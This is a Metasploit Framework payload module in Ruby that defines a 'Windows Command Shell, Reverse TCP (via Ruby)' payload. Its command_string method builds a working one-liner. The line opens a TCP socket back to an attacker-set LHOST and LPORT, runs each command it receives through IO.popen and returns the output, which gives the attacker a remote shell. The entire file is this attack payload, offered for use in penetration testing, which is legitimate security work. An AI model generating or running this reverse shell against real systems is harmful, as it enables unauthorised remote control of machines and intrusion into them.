##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 126

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'        => 'Windows Command Shell, Reverse TCP (via Ruby)',
     'Description' => 'Connect back and create a command shell via Ruby',
     'Author'      => 'kris katterjohn',
     'License'     => MSF_LICENSE,
     'Platform'    => 'win',
     'Arch'        => ARCH_CMD,
     'Handler'     => Msf::Handler::ReverseTcp,
     'Session'     => Msf::Sessions::CommandShell,
     'PayloadType' => 'cmd',
     'RequiredCmd' => 'ruby',
     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_advanced_options(
      [
        OptString.new('RubyPath', [true, 'The path to the Ruby executable', 'ruby'])
      ]
    )
  end

  def generate(_opts = {})
    return super + command_string
  end

  def command_string
    "#{datastore['RubyPath']} -rsocket -e \"c=TCPSocket.new(\\\"#{datastore['LHOST']}\\\",\\\"#{datastore['LPORT']}\\\");while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end\""
  end
end
